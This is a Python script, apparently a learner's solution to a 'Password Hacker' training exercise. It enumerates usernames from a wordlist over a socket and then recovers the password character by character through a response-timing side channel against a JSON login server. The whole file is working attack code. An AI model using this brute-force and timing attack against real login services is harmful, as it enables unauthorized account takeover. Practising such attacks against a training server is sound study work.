import sys
import socket
import itertools
import json
import string
import time

args = sys.argv

ip_var = args[1]
port_var = int(args[2])

new_socket = socket.socket()
new_socket.connect((ip_var, port_var))

charlist = string.ascii_lowercase + string.ascii_uppercase + string.digits

def pass_cracker(login):
    pw_compiler = []
    return find_nextchar(login, pw_compiler)


def find_nextchar(login, compiler):
    pw_compiler = compiler
    for i in charlist:
        pw_compiler.append(i)
        msg = {
                "login": f"{login}",
                "password": f"{''.join(pw_compiler)}"
                }
        js_msg = json.dumps(msg).encode()
        start = time.perf_counter()
        new_socket.send(js_msg)
        response = new_socket.recv(1024)
        end = time.perf_counter()
        if response.decode() == json.dumps({"result": "Connection success!"}):
            print(json.dumps({"login": f"{login}", "password": f"{''.join(pw_compiler)}"}))
            exit()
        elif ((end - start) * 1000) >= 1:
            find_nextchar(login, compiler)
        elif ((end - start) * 1000) < 1:
            pw_compiler.pop()



def find_login():
    with open(r'C:\Users\mikeb\PycharmProjects\Password Hacker\Password Hacker\task\hacking\logins.txt', 'r') as file:
        for i in file:
            msg = {
                "login" : f"{i.strip()}",
                "password" : " "
            }
            js_msg = json.dumps(msg).encode()
            new_socket.send(js_msg)
            response = new_socket.recv(1024)
            if response.decode() == json.dumps({"result": "Wrong password!"}):
                return pass_cracker(i.strip())
            if response.decode() == json.dumps({"result": "Wrong login!"}):
                continue

find_login()